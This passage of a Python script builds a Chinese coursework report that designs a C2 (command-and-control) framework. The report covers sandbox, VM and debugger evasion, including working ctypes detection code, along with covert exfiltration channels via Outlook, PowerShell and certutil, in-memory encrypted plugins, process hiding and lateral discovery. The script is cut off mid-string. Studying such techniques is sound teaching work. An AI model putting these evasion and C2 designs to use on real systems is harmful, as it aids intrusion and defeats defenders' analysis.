# -*- coding: utf-8 -*-
"""生成《网络安全编程课程设计报告》Word 文档（格式严格版）"""

from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml
import os

OUTPUT = r"E:\课设2\课程设计报告.docx"

# 字号常量（磅值）
SZ_TITLE   = Pt(28)   # 封面标题
SZ_SUB     = Pt(18)   # 封面副标题
SZ_H1      = Pt(14)   # 一级标题（四号）
SZ_H2      = Pt(16)   # 二级标题
SZ_H3      = Pt(14)   # 三级标题
SZ_BODY    = Pt(12)   # 正文（小四）
SZ_CODE    = Pt(9)    # 代码（小五）
SZ_TABLE   = Pt(10)   # 表格内容
SZ_TOC     = Pt(12)   # 目录正文（小四）
SZ_REF_HD  = Pt(12)   # 参考文献标题（小四）

# 行距
SP_BODY  = 1.25       # 正文 1.25 倍行距
SP_CODE  = 1.0        # 代码 单倍行距
SP_H1    = 1.0        # 一级标题 单倍行距

# 一级标题段前段后（0.5 行 ≈ 7pt @14pt）
H1_SPACE = Pt(7)

# ── helpers ──────────────────────────────────────────────────────────────────

def _set_char_spacing(run, twips):
    """设置 run 字符间距（单位 twip，1 twip = 1/20 pt）"""
    rPr = run._element.get_or_add_rPr()
    rPr.append(parse_xml(f'<w:spacing {nsdecls("w")} w:val="{twips}"/>'))


def set_cell_shading(cell, color_hex):
    """设置单元格背景色"""
    shading_elm = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color_hex}"/>')
    cell._tc.get_or_add_tcPr().append(shading_elm)


def set_table_borders(table):
    """为整个表格设置边框"""
    tbl = table._tbl
    tblPr = tbl.tblPr if tbl.tblPr is not None else parse_xml(f'<w:tblPr {nsdecls("w")}></w:tblPr>')
    borders = parse_xml(
        f'<w:tblBorders {nsdecls("w")}>'
        f'  <w:top w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        f'  <w:left w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        f'  <w:bottom w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        f'  <w:right w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        f'  <w:insideH w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        f'  <w:insideV w:val="single" w:sz="4" w:space="0" w:color="000000"/>'
        f'</w:tblBorders>'
    )
    tblPr.append(borders)


def set_field(paragraph, field_code):
    """在段落中插入 Word 域代码（如 TOC）"""
    run = paragraph.add_run()
    fldChar_begin = parse_xml(f'<w:fldChar {nsdecls("w")} w:fldCharType="begin"/>')
    run._element.append(fldChar_begin)
    run2 = paragraph.add_run()
    instrText = parse_xml(f'<w:instrText {nsdecls("w")} xml:space="preserve"> {field_code} </w:instrText>')
    run2._element.append(instrText)
    run3 = paragraph.add_run()
    fldChar_end = parse_xml(f'<w:fldChar {nsdecls("w")} w:fldCharType="end"/>')
    run3._element.append(fldChar_end)


def add_paragraph(doc, text, font_name="宋体", font_size=SZ_BODY, bold=False,
                  alignment=None, first_indent=None, line_spacing=SP_BODY,
                  space_before=Pt(0), space_after=Pt(6), char_spacing=None):
    """通用格式化段落，返回 paragraph 对象"""
    p = doc.add_paragraph()
    pf = p.paragraph_format
    pf.first_line_indent = first_indent
    pf.line_spacing = line_spacing
    pf.space_before = space_before
    pf.space_after = space_after
    if alignment is not None:
        p.alignment = alignment
    run = p.add_run(text)
    run.font.name = font_name
    run._element.rPr.rFonts.set(qn("w:eastAsia"), font_name)
    run.font.size = font_size
    run.bold = bold
    if char_spacing:
        _set_char_spacing(run, char_spacing)
    return p


def add_code_block(doc, code_text):
    """添加代码块：Times New Roman 小5号，单倍行距，灰色背景，必须有注释"""
    for line in code_text.split("\n"):
        p = doc.add_paragraph()
        pf = p.paragraph_format
        pf.space_before = Pt(0)
        pf.space_after = Pt(0)
        pf.line_spacing = SP_CODE          # 单倍行距
        pf.left_indent = Cm(1.0)
        # 灰色背景
        pPr = p._element.get_or_add_pPr()
        shd = parse_xml(f'<w:shd {nsdecls("w")} w:val="clear" w:color="auto" w:fill="F2F2F2"/>')
        pPr.append(shd)
        run = p.add_run(line if line else " ")
        run.font.name = "Times New Roman"              # 代码字体
        run._element.rPr.rFonts.set(qn("w:eastAsia"), "Times New Roman")
        run.font.size = SZ_CODE                        # 小五号（9pt）
        run.font.color.rgb = RGBColor(0x1A, 0x1A, 0x1A)


def add_formatted_table(doc, headers, rows, col_widths=None):
    """添加格式化表格"""
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    set_table_borders(table)
    # 表头
    hdr_cells = table.rows[0].cells
    for i, h in enumerate(headers):
        hdr_cells[i].text = h
        for p in hdr_cells[i].paragraphs:
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            for run in p.runs:
                run.bold = True
                run.font.size = SZ_TABLE
                run.font.name = "微软雅黑"
                run._element.rPr.rFonts.set(qn("w:eastAsia"), "微软雅黑")
        set_cell_shading(hdr_cells[i], "D9E2F3")
    # 数据行
    for r_idx, row_data in enumerate(rows):
        row_cells = table.rows[r_idx + 1].cells
        for c_idx, val in enumerate(row_data):
            row_cells[c_idx].text = val
            for p in row_cells[c_idx].paragraphs:
                for run in p.runs:
                    run.font.size = SZ_TABLE
                    run.font.name = "宋体"
                    run._element.rPr.rFonts.set(qn("w:eastAsia"), "宋体")
    # 列宽
    if col_widths:
        for r in table.rows:
            for i, w in enumerate(col_widths):
                r.cells[i].width = Cm(w)
    return table


def add_body(doc, text, bold=False, indent=True):
    """添加正文段落（小四宋体，1.25倍行距）"""
    fi = Cm(0.74) if indent else None
    return add_paragraph(doc, text, font_size=SZ_BODY, bold=bold,
                         first_indent=fi, line_spacing=SP_BODY, space_after=Pt(6))


def add_list_item(doc, text, ordered=False, number=None):
    """添加列表项"""
    prefix = f"{number}. " if number else "- "
    p = add_paragraph(doc, f"{prefix}{text}", line_spacing=SP_BODY, space_after=Pt(3))
    p.paragraph_format.left_indent = Cm(1.5)
    p.paragraph_format.first_line_indent = Cm(-0.5)
    return p


def add_h1(doc, text):
    """添加一级标题：顶格，四号黑体，不加粗，段前段后各0.5行"""
    p = doc.add_heading(text, level=1)
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT            # 顶格
    pf = p.paragraph_format
    pf.space_before = H1_SPACE                       # 段前0.5行
    pf.space_after = H1_SPACE                        # 段后0.5行
    pf.line_spacing = SP_H1                          # 单倍行距
    # 确保不加粗
    for run in p.runs:
        run.bold = False
        run.font.name = "黑体"
        run._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
        run.font.size = SZ_H1
    return p


def add_centered_heading(doc, text, size=SZ_REF_HD, char_spacing=200):
    """添加居中标题（参考文献用：小4号黑体居中，字间空一汉字格）"""
    p = doc.add_heading(text, level=1)
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    pf = p.paragraph_format
    pf.space_before = H1_SPACE
    pf.space_after = H1_SPACE
    pf.line_spacing = SP_H1
    for run in p.runs:
        run.bold = False
        run.font.name = "黑体"
        run._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
        run.font.size = size
        _set_char_spacing(run, char_spacing)          # 字间距
    return p


# ── main ─────────────────────────────────────────────────────────────────────

def generate():
    doc = Document()

    # ═══════════════════════════════════════════════════════════════════════
    # 页面设置
    # ═══════════════════════════════════════════════════════════════════════
    section = doc.sections[0]
    section.page_width = Cm(21.0)
    section.page_height = Cm(29.7)
    section.top_margin = Cm(2.54)
    section.bottom_margin = Cm(2.54)
    section.left_margin = Cm(3.18)
    section.right_margin = Cm(3.18)

    # ═══════════════════════════════════════════════════════════════════════
    # 样式定义
    # ═══════════════════════════════════════════════════════════════════════
    style = doc.styles["Normal"]
    style.font.name = "宋体"
    style.font.size = SZ_BODY
    style._element.rPr.rFonts.set(qn("w:eastAsia"), "宋体")

    # Heading 1：四号黑体，不加粗，黑色
    hs1 = doc.styles["Heading 1"]
    hs1.font.name = "黑体"
    hs1.font.size = SZ_H1
    hs1.font.color.rgb = RGBColor(0, 0, 0)
    hs1.font.bold = False
    hs1._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
    hs1.paragraph_format.space_before = H1_SPACE
    hs1.paragraph_format.space_after = H1_SPACE
    hs1.paragraph_format.line_spacing = SP_H1
    hs1.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.LEFT

    # Heading 2
    hs2 = doc.styles["Heading 2"]
    hs2.font.name = "黑体"
    hs2.font.size = SZ_H2
    hs2.font.color.rgb = RGBColor(0, 0, 0)
    hs2.font.bold = True
    hs2._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
    hs2.paragraph_format.space_before = Pt(12)
    hs2.paragraph_format.space_after = Pt(6)

    # Heading 3
    hs3 = doc.styles["Heading 3"]
    hs3.font.name = "黑体"
    hs3.font.size = SZ_H3
    hs3.font.color.rgb = RGBColor(0, 0, 0)
    hs3.font.bold = True
    hs3._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
    hs3.paragraph_format.space_before = Pt(8)
    hs3.paragraph_format.space_after = Pt(4)

    # ═══════════════════════════════════════════════════════════════════════
    # 封面
    # ═══════════════════════════════════════════════════════════════════════
    for _ in range(6):
        doc.add_paragraph()

    add_paragraph(doc, "网络安全编程课程设计报告", font_name="黑体",
                  font_size=SZ_TITLE, bold=True, alignment=WD_ALIGN_PARAGRAPH.CENTER)
    doc.add_paragraph()
    add_paragraph(doc, "智能自适应 C2（Command & Control）框架", font_name="黑体",
                  font_size=SZ_SUB, alignment=WD_ALIGN_PARAGRAPH.CENTER)
    doc.add_page_break()

    # ═══════════════════════════════════════════════════════════════════════
    # 目录（Word 域代码，打开文档后右键"更新域"即可生成）
    # ═══════════════════════════════════════════════════════════════════════
    toc_title = doc.add_heading("目  录", level=1)
    toc_title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in toc_title.runs:
        run.bold = False
        run.font.name = "黑体"
        run._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
        run.font.size = SZ_H1
        _set_char_spacing(run, 400)      # 字间空两汉字格

    p_toc = doc.add_paragraph()
    p_toc.paragraph_format.line_spacing = 1.5
    set_field(p_toc, 'TOC \\o "1-3" \\h \\z \\u')
    doc.add_page_break()

    # ═══════════════════════════════════════════════════════════════════════
    # 引 言（"引"与"言"之间空两汉字格）
    # ═══════════════════════════════════════════════════════════════════════
    p_yinyan = doc.add_heading("引　　言", level=1)
    p_yinyan.alignment = WD_ALIGN_PARAGRAPH.LEFT
    for run in p_yinyan.runs:
        run.bold = False
        run.font.name = "黑体"
        run._element.rPr.rFonts.set(qn("w:eastAsia"), "黑体")
        run.font.size = SZ_H1

    add_body(doc,
        "本课程设计旨在通过构建一个智能自适应 C2（Command & Control）框架，"
        "深入理解网络安全攻防对抗中的关键技术原理，提升网络安全编程能力。"
        "C2 框架是网络安全攻防演练中的核心基础设施，其设计涉及加密通信、"
        "环境感知、多通路通信、沙箱检测、插件化架构等多个技术领域。")
    add_body(doc,
        "本报告将从问题分析、架构设计、环境决策逻辑、防护规避策略、"
        "算法设计和编码实现等方面，全面阐述该框架的设计思路与技术实现，"
        "最后进行课程设计总结与心得体会分享。")
    doc.add_page_break()

    # ═══════════════════════════════════════════════════════════════════════
    # 一、 问题分析
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "一、 问题分析")

    doc.add_heading("1.1 项目背景", level=2)
    add_body(doc,
        "随着网络安全攻防对抗的不断升级，传统的安全检测手段面临着越来越大的挑战。"
        "攻击者利用各种技术手段来规避安全软件的检测，包括环境感知、通信隐蔽、数据加密等。"
        "本课程设计旨在通过构建一个智能自适应 C2（Command & Control）框架，"
        "深入理解攻防对抗中的关键技术原理，提升网络安全编程能力。")

    doc.add_heading("1.2 需求分析", level=2)
    add_body(doc, "本项目需要实现一个完整的 C2 框架，包含以下核心功能：")
    requirements = [
        "沙箱/虚拟机/调试器检测：在执行恶意行为前判断是否处于分析环境中，避免被安全研究人员逆向分析",
        "环境感知与自适应：自动识别目标系统信息、安全软件、常用应用，为后续通信策略提供决策依据",
        "多通路隐蔽通信：支持 TCP/UDP 加密套接字、Outlook COM 邮件外传、PowerShell/certutil 白名单通路等多种通信方式",
        "混合加密体系：采用 RSA-2048 + AES-256-GCM 混合加密，保障通信安全",
        "插件化模块管理：支持插件的加密打包、动态加载和远程执行",
        "分片传输：大数据包分片加密传输，规避流量监控",
        "内网横向探测：自动发现同网段存活主机",
        "窗口活动监控：通过 Windows API 采集用户窗口操作行为",
    ]
    for i, req in enumerate(requirements, 1):
        add_list_item(doc, req, ordered=True, number=i)

    doc.add_heading("1.3 技术路线", level=2)
    tech_routes = [
        ("开发语言", "Python 3.x"),
        ("加密算法", "RSA-2048（非对称）、AES-256-GCM（对称）"),
        ("通信协议", "自定义 JSON 协议，支持 TCP/UDP"),
        ("系统接口", "Windows API（ctypes）、WMI、COM 自动化"),
        ("运行环境", "控制端（Kali Linux）、受控端（Windows 10/11）"),
    ]
    add_formatted_table(doc, ["技术项", "说明"], tech_routes, col_widths=[4, 11])

    # ═══════════════════════════════════════════════════════════════════════
    # 二、 架构设计
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "二、 架构设计")

    doc.add_heading("2.1 整体架构", level=2)
    add_body(doc, "系统采用经典的 C/S（Client/Server）架构，分为三个核心组件：")
    for item in [
        "Controller（控制端，运行在 Kali Linux）：CLI 交互界面、会话管理、TCP 通信服务端",
        "Agent（受控端，运行在 Windows）：沙箱检测、环境感知、多通路通信、分片传输、模块加载、插件系统",
        "Shared（公共模块）：消息协议定义、RSA + AES-256-GCM 加密引擎",
    ]:
        add_list_item(doc, item)

    add_body(doc, "通信流程：", bold=True, indent=False)
    add_body(doc, "Agent 启动 -> 沙箱检测 -> 环境感知 -> RSA 密钥交换 -> 建立加密通道 -> 注册上线 -> 指令循环")

    doc.add_heading("2.2 目录结构", level=2)
    add_code_block(doc, """\
项目根目录/
  shared/                    # 公共模块
    protocol.py              # 通信协议定义（消息类型、指令类型）
    crypto.py                # 加密引擎（RSA-2048 + AES-256-GCM）
  controller/                # 控制端（运行在 Kali Linux）
    main.py                  # 控制端主程序（CLI 交互、会话管理）
    comm_server.py           # TCP 通信服务端
    utils.py                 # 格式化输出、会话日志
  agent/                     # 受控端（运行在 Windows）
    main.py                  # Agent 主程序（7 阶段生命周期）
    sandbox_detect.py        # 沙箱/VM/调试器检测
    env_perception.py        # WMI 环境感知
    comm_channels.py         # 多通路通信模块
    module_loader.py         # 加密模块动态加载器
    frag_transfer.py         # 分片传输模块
    utils.py                 # 管理员检测、安全删除、系统信息
    plugins/                 # 插件目录（加密存储）
      recon.py               # 网络侦察插件
      netprobe.py            # 内网横向探测插件
      winmon.py              # 窗口活动监控插件
  pack_plugin.py             # 插件打包加密工具
  key.txt                    # 插件加密密钥""")

    doc.add_heading("2.3 模块职责划分", level=2)
    module_rows = [
        ("Protocol", "定义消息类型、指令类型、消息构建与解析", "shared/protocol.py"),
        ("CryptoEngine", "RSA 密钥管理、AES 加解密、消息加解密", "shared/crypto.py"),
        ("Controller", "CLI 交互、Agent 会话管理、指令下发", "controller/main.py"),
        ("CommServer", "TCP 监听、连接管理、密钥交换", "controller/comm_server.py"),
        ("Agent", "主控逻辑、7 阶段生命周期管理", "agent/main.py"),
        ("SandboxDetector", "调试器/VM/沙箱检测与风险评估", "agent/sandbox_detect.py"),
        ("EnvPerception", "WMI 环境感知、安全软件识别", "agent/env_perception.py"),
        ("ChannelManager", "多通路自适应选择与管理", "agent/comm_channels.py"),
        ("Fragmenter", "数据分片与重组", "agent/frag_transfer.py"),
        ("EncryptedModuleFinder", "加密插件动态加载", "agent/module_loader.py"),
        ("agent/utils", "管理员检测、安全删除、系统信息采集", "agent/utils.py"),
        ("controller/utils", "格式化输出、会话日志记录", "controller/utils.py"),
    ]
    add_formatted_table(doc, ["模块", "职责", "文件"], module_rows, col_widths=[3.5, 6.5, 5])

    # ═══════════════════════════════════════════════════════════════════════
    # 三、 环境决策逻辑
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "三、 环境决策逻辑")

    doc.add_heading("3.1 Agent 生命周期（7 阶段）", level=2)
    add_body(doc, "Agent 启动后按严格顺序执行以下 7 个阶段：")
    phases = [
        "Phase 1: 沙箱/VM/调试器检测 -> risk_score 判断是否继续",
        "Phase 2: WMI 环境感知 -> EnvProfile 生成",
        "Phase 3: 生成 RSA-2048 密钥对",
        "Phase 4: 建立通信连接（ChannelManager.connect_best()）",
        "Phase 5: RSA 密钥交换（双方公钥互换 -> 加密通道建立）",
        "Phase 6: 发送注册信息（系统信息、安全软件列表）",
        "Phase 7: 指令执行循环（等待指令 -> 执行 -> 返回结果）",
    ]
    for i, ph in enumerate(phases, 1):
        add_list_item(doc, ph, ordered=True, number=i)

    doc.add_heading("3.2 沙箱检测决策算法", level=2)
    add_body(doc, "采用加权评分机制，对 11 项检测指标进行综合评估：")
    detect_rows = [
        ("IsDebuggerPresent", "3", "kernel32 API"),
        ("CheckRemoteDebuggerPresent", "3", "kernel32 API"),
        ("调试器进程检测", "2", "tasklist 扫描"),
        ("VM 注册表检测", "2", "RegOpenKeyExW API"),
        ("VM 进程检测", "2", "tasklist 扫描"),
        ("VM MAC 地址检测", "2", "getmac 前缀匹配"),
        ("系统运行时间", "1", "GetTickCount64"),
        ("鼠标移动检测", "1", "GetCursorInfo 采样"),
        ("键盘输入检测", "1", "GetAsyncKeyState"),
        ("磁盘容量检测", "1", "VMware/VirtualBox 磁盘 < 60GB"),
        ("桌面进程检测", "1", "GetForegroundWindow"),
    ]
    add_formatted_table(doc, ["检测项", "权重", "检测方法"], detect_rows, col_widths=[5, 2, 5])

    doc.add_paragraph()
    add_body(doc, "决策阈值：", bold=True, indent=False)
    for t in [
        "risk_ratio >= 0.5  ->  判定为沙箱，执行伪装退出（不产生异常日志）",
        "0.25 <= risk_ratio < 0.5  ->  可疑环境，降低行为频率",
        "risk_ratio < 0.25  ->  正常环境，继续执行",
    ]:
        add_list_item(doc, t)

    doc.add_heading("3.3 通信通路选择决策", level=2)
    add_body(doc, "根据 EnvProfile 环境画像动态选择通信通道：")
    channel_priority = [
        ("优先级 1", "TCP 加密套接字", "始终可用，最可靠"),
        ("优先级 2", "Outlook COM 邮件通道", "需检测到 Outlook 进程"),
        ("优先级 3", "PowerShell 白名单通路", "Windows 自带，通常不被拦截"),
        ("优先级 4", "UDP 通道", "备选方案"),
        ("优先级 5", "Certutil 白名单通路", "最后手段"),
    ]
    add_formatted_table(doc, ["优先级", "通道", "说明"], channel_priority, col_widths=[2.5, 5, 6])
    add_body(doc,
        "connect_best() 方法按优先级依次尝试连接，返回第一个成功的通道。"
        "失败时自动降级到下一通道，实现通信通路自适应容错。")

    # ═══════════════════════════════════════════════════════════════════════
    # 四、 防护规避策略
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "四、 防护规避策略")

    doc.add_heading("4.1 环境规避", level=2)
    add_body(doc, "目标：避免在沙箱/分析环境中暴露恶意行为。", bold=True, indent=False)
    add_body(doc, "策略：", bold=True, indent=False)
    for i, e in enumerate([
        "多维度检测：结合 API 检测、注册表检测、进程检测、行为检测、硬件特征检测",
        "加权综合评估：不是单一指标判断，而是加权求和后取阈值，降低误判率",
        "伪装退出：检测到沙箱后不直接退出（会留下异常日志），而是模拟正常程序行为后静默退出",
    ], 1):
        add_list_item(doc, e, ordered=True, number=i)

    doc.add_heading("4.2 通信规避", level=2)
    add_body(doc, "目标：规避网络流量监控和防火墙检测。", bold=True, indent=False)
    add_body(doc, "策略：", bold=True, indent=False)
    for i, e in enumerate([
        "多通路切换：当 TCP 被阻断时，自动降级到 Outlook 邮件通道、PowerShell 白名单通道等",
        "白名单工具利用：使用系统自带的 PowerShell、certutil 等通常在安全软件白名单中的工具进行通信",
        "分片传输：将大数据包按 4KB 分片，逐片加密发送，设置发送间隔（0.1s/片），规避单包大小检测和流量突发检测",
        "消息加密：所有通信内容均经过 AES-256-GCM 加密，无法通过流量内容判断指令类型",
    ], 1):
        add_list_item(doc, e, ordered=True, number=i)

    doc.add_heading("4.3 进程规避", level=2)
    add_body(doc, "目标：降低被进程监控发现的风险。", bold=True, indent=False)
    add_body(doc, "策略：", bold=True, indent=False)
    for i, e in enumerate([
        "CREATE_NO_WINDOW 标志：所有子进程创建时使用 creationflags=0x08000000，不创建可见窗口",
        "PowerShell Hidden 模式：使用 -WindowStyle Hidden 参数",
        "进程名伪装：Agent 可重命名为常见合法程序名",
    ], 1):
        add_list_item(doc, e, ordered=True, number=i)

    doc.add_heading("4.4 插件保护", level=2)
    add_body(doc, "目标：防止插件代码被静态分析。", bold=True, indent=False)
    add_body(doc, "策略：", bold=True, indent=False)
    for i, e in enumerate([
        "编译+加密：.py -> .pyc -> AES-256-GCM 加密 -> .enc 文件",
        "内存解密执行：加载时在内存中解密并执行，不落地到磁盘",
        "独立密钥：插件加密使用独立密钥（key.txt），与通信密钥分离",
    ], 1):
        add_list_item(doc, e, ordered=True, number=i)

    # ═══════════════════════════════════════════════════════════════════════
    # 五、 算法设计
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "五、 算法设计")

    doc.add_heading("5.1 RSA-2048 + AES-256-GCM 混合加密算法", level=2)
    add_body(doc,
        "设计思路：RSA 加密速度慢但无需预共享密钥，AES 加密速度快但需要安全传递密钥。"
        "两者结合取长补短。")
    add_body(doc, "密钥交换流程：", bold=True, indent=False)
    for i, k in enumerate([
        "Controller -> Agent：RSA 公钥 PEM（明文传输）",
        "Agent -> Controller：RSA 公钥 PEM（明文传输）",
        "双方各自生成 AES-256 会话密钥，用对方公钥加密会话密钥",
        "后续通信使用 AES-256-GCM 加密",
    ], 1):
        add_list_item(doc, k, ordered=True, number=i)

    add_body(doc, "消息加密结构：", bold=True, indent=False)
    add_formatted_table(doc, ["字段", "说明"], [
        ("header", "{session_id, seq, timestamp, channel, type}"),
        ("encrypted_key", "RSA-OAEP 加密的 AES 密钥"),
        ("nonce", "96-bit 随机数 (AES-GCM)"),
        ("payload", "AES-256-GCM 密文"),
        ("tag", "128-bit 认证标签"),
    ], col_widths=[4, 10])
    add_body(doc, "传输格式：4 字节长度前缀 + JSON（base64 编码二进制字段）")
    add_body(doc, "防重放攻击：每条消息携带时间戳，接收端验证消息时效性（默认 5 分钟过期）")

    doc.add_heading("5.2 沙箱检测加权评分算法", level=2)
    add_body(doc, "检测项集合 C = {c1, c2, ..., c11}，每项权重 wi，检测结果 ri 属于 {0, 1}。")
    add_body(doc, "risk_score = Sum(ri * wi)，max_score = 3+3+2+2+2+2+1+1+1+1+1 = 19")
    add_body(doc, "risk_ratio = risk_score / max_score")
    add_body(doc, "权重设计依据：", bold=True, indent=False)
    for w in [
        "调试器检测权重最高（3），因为调试器是最强的分析信号",
        "VM 特征检测权重次之（2），虚拟机是常见分析环境",
        "行为检测权重最低（1），因为单个行为指标误判率较高",
    ]:
        add_list_item(doc, w)

    doc.add_heading("5.3 分片传输算法", level=2)
    add_body(doc,
        "分片策略：默认分片大小 4096 字节（4KB），每片包含传输 ID、片号、总片数、校验和、数据，"
        "发送间隔 0.1 秒/片。")
    add_body(doc, "分片格式：[4 字节元数据长度][JSON 元数据][分片数据]")
    add_body(doc,
        "重组算法：按 transfer_id 分组 -> 按 chunk_index 顺序拼接 -> 验证校验和 -> 全部到齐后重组")

    doc.add_heading("5.4 内网探测算法", level=2)
    add_body(doc, "采用双探针策略提高发现率：")
    for i, n in enumerate([
        "TCP 445 端口探测（connect_ex，超时 0.5s）-> 成功则记录为存活",
        "失败则 ICMP Ping 探测（ping -n 1 -w 500）-> 成功则记录为存活",
    ], 1):
        add_list_item(doc, n, ordered=True, number=i)
    add_body(doc, "使用线程池 + 信号量控制并发（默认最大 50 线程），避免网络拥塞。")

    # ═══════════════════════════════════════════════════════════════════════
    # 六、 编码实现
    # ═══════════════════════════════════════════════════════════════════════
    add_h1(doc, "六、 编码实现")

    doc.add_heading("6.2 Windows API 高强度沙箱/虚拟环境检测（agent/sandbox_detect.py）", level=2)
    add_body(doc,
        "本模块是 Agent 启动后的第一道防线，通过 ctypes 直接调用原生 Windows API，"
        "在无第三方依赖、无管理员权限、无文件/注册表残留的前提下，完成对调试器、虚拟机、"
        "沙箱环境的多层次检测。核心设计思路是\"加权综合评估\"——不依赖单一指标，"
        "而是将 11 项检测结果加权求和，得到风险评分后分三档决策，显著降低误判率。")

    # ── 6.2.1 模块初始化与特征库定义 ──
    doc.add_heading("6.2.1 模块初始化与特征库", level=3)
    add_body(doc,
        "模块通过 ctypes 加载 kernel32、user32、advapi32 三个系统 DLL，"
        "直接调用 Windows API 而不依赖第三方库。特征库以常量列表形式硬编码，"
        "覆盖 VMware/VirtualBox 的注册表键值、进程名、MAC 地址前缀，"
        "以及 x64dbg、IDA、Wireshark 等主流调试分析工具的进程名：")
    add_code_block(doc, """\
import ctypes, ctypes.wintypes
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
advapi32 = ctypes.windll.advapi32

# 虚拟机注册表特征键（通过 RegOpenKeyExW 只读探测，无残留）
VM_REGISTRY_KEYS = [
    (0x80000002, r"SOFTWARE\\VMware, Inc.\\VMware Tools"),
    (0x80000002, r"SOFTWARE\\Oracle\\VirtualBox Guest Additions"),
    (0x80000002, r"SYSTEM\\CurrentControlSet\\Services\\vmci"),
    (0x80000002, r"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"),
]
# 虚拟机/调试器进程名特征库
VM_PROCESSES = ["vmtoolsd.exe", "vmwaretray.exe", "VBoxService.exe", "VBoxTray.exe"]
DEBUGGER_PROCESSES = ["x64dbg.exe", "ollydbg.exe", "ida.exe", "windbg.exe",
                      "wireshark.exe", "procmon.exe", "processhacker.exe"]
# VMware/VirtualBox MAC 地址 OUI 前缀（3 字节）
VM_MAC_PREFIXES = [b"\\x00\\x05\\x69", b"\\x00\\x0c\\x29",   # VMware
                   b"\\x00\\x50\\x56", b"\\x08\\x00\\x27"]    # VirtualBox""")

    # ── 6.2.2 调试器检测实现 ──
    doc.add_heading("6.2.2 调试器检测（权重最高，共 8 分）", level=3)
    add_body(doc,
        "调试器检测是最强的反分析信号，因此权重最高。实现三种互补的检测方式："
        "IsDebuggerPresent 检测本地调试器，CheckRemoteDebuggerPresent 检测远程调试器，"
        "tasklist 进程扫描检测调试器/分析工具是否在运行。"
        "三种方式分别从 API 层和进程层覆盖不同的调试场景：")
    add_code_block(doc, """\
def check_debugger_present(self):
    # IsDebuggerPresent: PEB.BeingDebugged 标志位检测
    # 权重 3，直接由 kernel32 调用，无需管理员权限，无文件残留
    return bool(kernel32.IsDebuggerPresent())

def check_remote_debugger(self):
    # CheckRemoteDebuggerPresent: 检测是否有远程调试器附加
    # 权重 3，通过 GetCurrentProcess 获取当前进程句柄后查询
    is_debugged = ctypes.wintypes.BOOL(False)
    handle = kernel32.GetCurrentProcess()
    kernel32.CheckRemoteDebuggerPresent(handle, ctypes.byref(is_debugged))
    return bool(is_debugged)

def check_debugger_processes(self):
    # tasklist 进程扫描: 遍历当前进程列表匹配调试器特征名
    # 权重 2，覆盖 x64dbg/IDA/Wireshark/ProcessHacker 等分析工具
    output = subprocess.check_output("tasklist /FO CSV /NH", shell=True, timeout=5)
    proc_list = output.decode("utf-8", errors="ignore").lower()
    for proc in DEBUGGER_PROCESSES:
        if proc.lower() in proc_list:
            return True
    return False""")

    # ── 6.2.3 虚拟机检测实现 ──
    doc.add_heading("6.2.3 虚拟机特征检测（共 6 分）", level=3)
    add_body(doc,
        "从三个维度检测虚拟机环境：注册表键值、运行进程、MAC 地址前缀。"
        "注册表检测使用 RegOpenKeyExW 以 KEY_READ 只读方式打开，不创建不修改，"
        "返回 0 即表示键存在（VMware/VirtualBox 安装后必然写入这些键）。"
        "MAC 地址前缀由 IEEE 分配，VMware 固定使用 00:05:69/00:0C:29/00:50:56，"
        "VirtualBox 使用 08:00:27，通过 getmac 命令获取后逐字节比对：")
    add_code_block(doc, """\
def check_vm_registry(self):
    # 权重 2: 探测 VMware/VirtualBox 注册表安装痕迹
    # RegOpenKeyExW 只读打开，不修改注册表，无痕迹残留
    for hive, path in VM_REGISTRY_KEYS:
        hkey = ctypes.wintypes.HKEY()
        ret = advapi32.RegOpenKeyExW(hive, path, 0, 0x20019, ctypes.byref(hkey))
        if ret == 0:           # ERROR_SUCCESS = 键存在
            advapi32.RegCloseKey(hkey)
            return True
    return False

def check_vm_processes(self):
    # 权重 2: 扫描 VM 增强工具进程 (vmtoolsd/VBoxService 等)
    output = subprocess.check_output("tasklist /FO CSV /NH", shell=True, timeout=5)
    proc_list = output.decode("utf-8", errors="ignore").lower()
    return any(p.lower() in proc_list for p in VM_PROCESSES)

def check_vm_mac(self):
    # 权重 2: MAC 地址 OUI 前缀匹配
    # getmac 输出 -> 提取前 3 字节 -> 与 VM 前缀库比对
    output = subprocess.check_output("getmac /FO CSV /NH", shell=True, timeout=5)
    for line in output.decode("utf-8", errors="ignore").strip().split("\\n"):
        mac = line.split(",")[0].strip('"').replace("-", ":")
        parts = mac.split(":")
        if len(parts) >= 3:
            prefix = bytes(int(p, 16) for p in parts[:3])
            if prefix in VM_MAC_PREFIXES:
                return True
    return False""")

    # ── 6.2.4 人机交互行为检测 ──
    doc.add_heading("6.2.4 人机交互行为检测（共 3 分）", level=3)
    add_body(doc,
        "沙箱和自动化测试环境通常缺乏真实的人机交互行为。本模块通过三种行为检测"
        "区分真人主机与自动化环境：鼠标位置采样（GetCursorInfo API 三次采样间隔 0.3 秒，"
